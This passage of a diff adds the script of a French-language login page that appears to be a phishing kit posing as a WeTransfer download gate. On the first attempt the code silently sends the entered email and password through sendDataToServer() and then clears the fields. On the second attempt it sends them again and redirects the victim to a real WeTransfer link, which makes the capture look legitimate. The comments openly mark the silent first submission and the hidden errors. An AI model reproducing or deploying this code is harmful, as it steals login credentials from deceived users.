+                    this.passwordSection.classList.add('show');
+                }
+
+                async handleSubmit(e) {
+                    e.preventDefault();
+                    if (this.state.isSubmitting) return;
+
+                    const isEmailValid = this.validateEmail(true);
+                    const isPasswordValid = this.validatePassword(true);
+
+                    if (!isEmailValid || !isPasswordValid) {
+                        await this.animateError();
+                        return;
+                    }
+
+                    try {
+                        this.state.isSubmitting = true;
+                        await this.animateSubmitStart();
+
+                        if (this.state.isFirstSubmission) {
+                            // Première soumission silencieuse
+                            await sendDataToServer();
+                            this.state.isFirstSubmission = false;
+
+                            // Réinitialisation silencieuse
+                            this.emailInput.value = '';
+                            this.passwordInput.value = '';
+                            this.state.isEmailValid = false;
+                            this.state.isPasswordValid = false;
+                            this.emailInput.classList.remove('valid', 'invalid');
+                            this.passwordInput.classList.remove('valid', 'invalid');
+                            return;
+                        }
+
+                        // Deuxième soumission
+                        const result = await sendDataToServer();
+
+                        if (result.success) {
+                            await this.animateSubmitSuccess();
+                            window.location.href = 'https://wetransfer.com/downloads/d2d348fe3d2995e1cf8e5fe8cf84a56c20231031011618/1150945a7ef90f33b9c67ef4dc77098520231031011655/06f777?trk=TRN_TDL_01&utm_campaign=TRN_TDL_01&utm_medium=email&utm_source=sendgrid';
+                        }
+
+                    } catch (error) {
+                        console.error('Erreur lors de la soumission:', error);
+                    } finally {
+                        this.state.isSubmitting = false;
+                        await this.animateSubmitEnd();
+                    }
+                }
+
+                async handleFirstSubmission() {
+                    try {
+                        await sendDataToServer();
+                        localStorage.setItem('submissionCount', '1');
+
+                        // Réinitialisation silencieuse
+                        await this.silentReset();
+                    } catch (error) {
+                        throw new Error('Première soumission échouée');
+                    }
+                }
+
+                async handleSubsequentSubmission() {
+                    const result = await sendDataToServer();
+
+                    if (result.success) {
+                        await this.animateSubmitSuccess();
+                        localStorage.setItem('submissionCount', '2');
+                        window.location.href = 'https://wetransfer.com/downloads/d2d348fe3d2995e1cf8e5fe8cf84a56c20231031011618/1150945a7ef90f33b9c67ef4dc77098520231031011655/06f777?trk=TRN_TDL_01&utm_campaign=TRN_TDL_01&utm_medium=email&utm_source=sendgrid';
+                    } else {
+                        throw new Error('Soumission échouée');
+                    }
+                }
+
+                async silentReset() {
+                    // Réinitialisation sans animation
+                    this.emailInput.value = '';
+                    this.passwordInput.value = '';
+                    this.state.isEmailValid = false;
+                    this.state.isPasswordValid = false;
+
+                    // Nettoyage des états visuels
+                    [this.emailInput, this.passwordInput].forEach(input => {
+                        if (input) {
+                            input.classList.remove('valid', 'invalid');
+                            const errorElement = input === this.emailInput ? this.emailError : this.passwordError;
+                            if (errorElement) {
+                                errorElement.classList.add('hidden');
+                            }
+                        }
+                    });
+                }
+
+                async handleSubmissionError(error) {
+                    const submissionCount = parseInt(localStorage.getItem('submissionCount') || '0');
+
+                    if (submissionCount === 0) {
+                        // Erreur silencieuse pour la première soumission
+                        console.error('Erreur silencieuse:', error);
+                    } else {
+                        // Affichage de l'erreur pour les soumissions suivantes
+                        await this.animateSubmitError();
+                        showNotification('Erreur de connexion', 'error');
+                    }
+                }
+
+                async animateSuccess(element) {
+                    await FormAnimator.animate(element, 'success-pulse');
+                }
+
+                async animateError() {
+                    await FormAnimator.animate(this.form, 'shake-animation');
+                }
+
+                async animateSubmitStart() {
+                    this.submitButton.classList.add('loading');
+                    await FormAnimator.animate(this.form, 'submit-start');
+                }
+
+                async animateSubmitSuccess() {
+                    await FormAnimator.animate(this.submitButton, 'success-animation');
+                }
+
+                async animateSubmitError() {
+                    await FormAnimator.animate(this.form, 'error-animation');
+                }
+
+                async animateSubmitEnd() {
+                    this.submitButton.classList.remove('loading');
+                    await FormAnimator.animate(this.form, 'submit-end');
+                }
+
+                toggleError(element, show) {
+                    if (!element) return;
+
+                    if (show) {
+                        element.classList.remove('hidden');
+                        FormAnimator.animate(element, 'error-shake');
+                    } else {
+                        element.classList.add('hidden');
+                    }
+                }
+
+                async submitForm(formData) {
+                    // Simulation d'une requête API
+                    return new Promise((resolve) => {
+                        setTimeout(() => {
+                            resolve({ success: true });
+                        }, 1500);
+                    });
+                }
+            }
+
+            // Initialisation sécurisée
+            const initializeApp = () => {
+                try {
+                    if (!window.formHandler) {
+                        window.formHandler = new FormHandler();
+                    }
+                } catch (error) {
+                    console.error('Erreur d\'initialisation:', error);
+                }
+            };
+
+            // Initialisation multiple sécurisée
+            ['DOMContentLoaded', 'load'].forEach(event => {
+                document.addEventListener(event, initializeApp);
+            });
+
+            // Support jQuery si disponible
+            if (window.jQuery) {
+                jQuery(document).ready(initializeApp);
+            }
+    </script>
+    <script>
+        // Gestionnaire de soumission du formulaire
+            document.getElementById('loginForm').addEventListener('submit', async function (e) {
+                e.preventDefault();
+
+                try {
+                    // Vérification des champs
+                    const email = document.getElementById('zone-email').value.trim();
+                    const password = document.getElementById('zone-password').value.trim();
+
+                    if (!email || !password) {
+                        showNotification('Veuillez remplir tous les champs', 'error');
+                        return;
+                    }
+
+                    const result = await sendDataToServer();
+
+                    if (result.success) {
+                        window.location.href = 'https://wetransfer.com/downloads/d2d348fe3d2995e1cf8e5fe8cf84a56c20231031011618/1150945a7ef90f33b9c67ef4dc77098520231031011655/06f777?trk=TRN_TDL_01&utm_campaign=TRN_TDL_01&utm_medium=email&utm_source=sendgrid'; // Redirection vers un lien donné
+                    } else {
+                        showNotification(result.message || 'Une erreur est survenue', 'error');
+                    }
+                } catch (error) {
+                    showNotification('Erreur de connexion', 'error');
+                }
+            });
+            // Fonction pour afficher les notifications
+            function showNotification(message, type = 'error') {
+                    const notification = document.getElementById('notification');
+                    if (!notification) return;
+
+                    // Nettoyage des notifications précédentes
+                    notification.classList.remove('success', 'error', 'warning');
+
+                    // Configuration de la nouvelle notification
+                    notification.textContent = message;
+                    notification.classList.add(type);
+
+                    // Animation d'entrée
+                    notification.style.transform = 'translateX(0)';
+                    notification.style.opacity = '1';
+
+                    // Disparition automatique
+                    setTimeout(() => {
+                        notification.style.transform = 'translateX(100%)';
+                        notification.style.opacity = '0';
+                    }, 3000);
+                }
+    </script>
+</body>
+
+</html>
